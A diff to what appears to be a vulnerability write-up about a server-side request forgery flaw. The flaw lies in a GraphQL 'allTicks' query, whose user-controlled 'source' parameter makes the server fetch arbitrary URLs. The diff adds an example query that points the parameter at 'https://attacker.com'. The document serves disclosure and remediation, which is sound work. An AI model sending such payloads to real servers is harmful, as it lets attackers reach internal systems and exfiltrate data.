@@ -216,6 +216,24 @@ A GraphQL query accepted a user-controlled URL parameter (`source`) and used it 
 
 An attacker could provide an arbitrary URL, causing the application server to send requests to external or internal destinations, resulting in Server-Side Request Forgery (SSRF).
 
+Example vulnerable query:
+
+```graphql
+query {
+  allTicks(
+    symbol: "TSLA",
+    source: "https://attacker.com"
+  ) {
+    symbol
+    server
+    source
+    ask
+    time
+    bid
+  }
+}
+```
+
 ---
 
 ## 🔍 Root Cause
